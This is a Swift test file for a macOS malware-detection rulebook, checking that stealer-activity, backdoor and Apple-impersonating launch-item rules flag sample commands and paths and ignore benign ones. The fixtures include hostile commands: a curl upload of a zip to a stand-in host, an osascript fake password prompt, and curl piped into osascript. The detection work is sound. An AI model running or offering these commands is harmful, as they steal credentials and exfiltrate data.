import Foundation
import Testing
@testable import BluehatCore

struct StarterRuleTests {
    let rulebook: Rulebook

    init() throws {
        let url = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
            .appending(components: "rules", "rules.json")
        rulebook = try Rulebook.decode(from: Data(contentsOf: url))
    }

    func matches(_ ruleID: String, _ text: String) throws -> Bool {
        let rule = try #require(rulebook.rules.first { $0.id == ruleID })
        return Scanner.matches(Scanner.regexes(rule.patterns), text)
    }

    @Test(arguments: [
        "curl --connect-timeout 120 --max-time 300 -X POST -F \"file=@/tmp/out.zip\" https://sivvino.example/contact",
        "ditto -c -k --sequesterRsrc /tmp/9556/ /tmp/out.zip",
        "osascript -e display dialog \"Application wants to install helper\" default answer \"\" with hidden answer",
        "curl -fsSL https://x.example/a.scpt | osascript",
    ])
    func detectsStealerActivity(command: String) throws {
        #expect(try matches("process.stealer-activity", command))
    }

    @Test(arguments: [
        "curl -F file=@/Users/me/report.pdf https://upload.example",
        "ditto -c -k --sequesterRsrc --keepParent MyApp.app MyApp.zip",
        "osascript -e display dialog \"Done\"",
    ])
    func ignoresNormalCommands(command: String) throws {
        #expect(try !matches("process.stealer-activity", command))
    }

    @Test func detectsAmosBackdoorLoop() throws {
        #expect(try matches("process.stealer-backdoor", "/bin/bash /Users/alex/.agent"))
        #expect(try !matches("process.stealer-backdoor", "/Users/alex/.agentrc-loader"))
    }

    @Test func detectsAppleNamedLaunchItemsOutsideSystem() throws {
        #expect(try matches("launch.apple-impersonation", "/Users/alex/Library/LaunchAgents/com.apple.crashreporter.helper.plist"))
        #expect(try matches("launch.apple-impersonation", "/Library/LaunchDaemons/com.apple.systemupdater.plist"))
        #expect(try !matches("launch.apple-impersonation", "/Library/LaunchDaemons/com.google.keystone.daemon.plist"))
    }
}
